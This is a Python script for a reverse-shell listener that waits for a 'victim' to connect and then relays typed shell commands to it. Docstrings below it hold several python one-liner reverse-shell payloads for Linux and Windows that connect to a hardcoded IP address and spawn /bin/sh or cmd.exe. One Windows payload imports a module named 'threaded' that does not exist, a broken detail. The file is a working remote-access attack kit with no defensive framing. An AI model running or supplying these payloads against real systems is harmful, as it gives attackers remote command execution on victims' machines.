import socket

def start_listener():
    # Must match the port in your victim script
    host = '0.0.0.0' # Listen on all available interfaces
    port = 1234      

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # This allows us to reuse the port immediately if the script restarts
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(1)
    
    print(f"[*] Listening on port {port}... (Waiting for victim)")
    
    conn, addr = server.accept()
    print(f"[*] Connection established from {addr[0]}:{addr[1]}")

    try:
        while True:
            # Get command input from you
            command = input("Shell> ")
            if not command.strip():
                continue
            
            # Send command to victim
            conn.send(command.encode() + b'\n')
            
            # If you want to exit the demo
            if command.lower() == "exit":
                break

            # Receive the output from the victim
            # Note: We use a timeout or small buffer for the demo
            result = conn.recv(4096).decode(errors='replace')
            print(result)
            
    except Exception as e:
        print(f"[*] Error: {e}")
    finally:
        conn.close()
        server.close()

if __name__ == "__main__":
    start_listener()
"""
linux:
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"26.106.250.206\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i"]);"

window:
python -c "import socket,os,subprocess,threaded;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('26.106.250.206',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['cmd.exe'])"

python -c "import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('26.106.250.206',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh'])"
"""


"""
python -c "import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('26.106.250.206',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh'])" 
"""